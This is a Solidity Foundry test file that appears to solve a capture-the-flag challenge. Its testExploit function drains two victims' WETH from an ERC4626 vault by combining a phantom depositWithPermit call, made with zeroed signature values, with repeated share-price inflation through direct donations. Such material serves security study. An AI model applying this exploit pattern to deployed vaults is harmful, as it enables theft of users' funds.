// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        weth.deposit{value: 10 ether}();

        weth.approve(attacker, type(uint256).max);

        while (weth.balanceOf(bob) != 0) {
            weth.approve(address(vault), 1 wei);
            vault.deposit(1 wei, attacker);

            weth.transferFrom(attacker, address(vault), 5 ether);

            vault.depositWithPermit(
                bob,
                5 ether,
                block.timestamp + 1 days,
                0,
                0,
                0
            );

            uint256 maxAmount = vault.maxWithdraw(attacker);

            vault.withdraw(maxAmount, attacker, attacker);
        }

        while (weth.balanceOf(alice) != 0) {
            weth.approve(address(vault), 1 wei);
            vault.deposit(1 wei, attacker);

            weth.transferFrom(attacker, address(vault), 5 ether);

            vault.depositWithPermit(
                alice,
                5 ether,
                block.timestamp + 1 days,
                0,
                0,
                0
            );

            uint256 maxAmount = vault.maxWithdraw(attacker);

            vault.withdraw(maxAmount, attacker, attacker);
        }

        vm.stopPrank();

        assertGt(
            weth.balanceOf(address(attacker)),
            1000 ether,
            "Attacker should have more than 1000 ether"
        );
    }
}
